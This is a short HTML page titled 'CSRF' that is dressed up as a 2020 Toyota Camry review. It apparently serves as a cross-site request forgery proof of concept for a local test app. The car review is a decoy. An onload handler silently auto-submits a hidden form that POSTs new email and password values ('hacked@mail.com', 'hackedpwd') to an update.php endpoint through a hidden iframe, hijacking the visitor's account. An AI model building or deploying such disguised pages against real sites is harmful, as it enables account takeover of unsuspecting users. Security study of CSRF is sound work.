
<html>
  <head>
    <title> CSRF </title>
  </head>
  <body onload = "document.csrfForm.submit()">
    <h1>2020 Toyota Camry</h1>
    <picture>
      <img src="2020_toyota_camry.jpg" align=”left” >
    </picture>
  <ul>
    <li>Now standard with Android Auto smartphone compatibility
</li>
    <li>New all-wheel-drive model debuts
</li>
    <li>New performance-oriented TRD model joins the lineup
</li>
    <li>Part of the eighth Camry generation introduced for 2018
</li>
  </ul>
  <h3>Pros & Cons</h3>
  <ul>
    <li type = circle>
      Four-cylinder engine delivers strong fuel economy
    </li>
    <li type = circle>
      Offers plenty of cabin and cargo space
    </li>
    <li type = circle>
      Good seats, steering and visibility make it easy to drive
    </li>
  </ul>
  </style>
  <ul>
    <li type = square>
      Native infotainment system is dated and awkward to use
    </li>
    <li type = square>
      Engine noise is loud and unrefined during acceleration
    </li>
    <li type = square>
      Advanced driver aids can be overly sensitive
    </li>
  </ul>
    <form action = "http://localhost:8080/bolt-origin/update.php"
    method = "POST" target = "hiddenFrame" name = "csrfForm">
    <input type = "hidden" name = "email" value = "hacked@mail.com"/>
      <input type = "hidden" name = "pwd" value = "hackedpwd"/>
    </form>
    <iframe name = "hidenFrame" style = "display:none;"></iframe>
  </body>
</html>
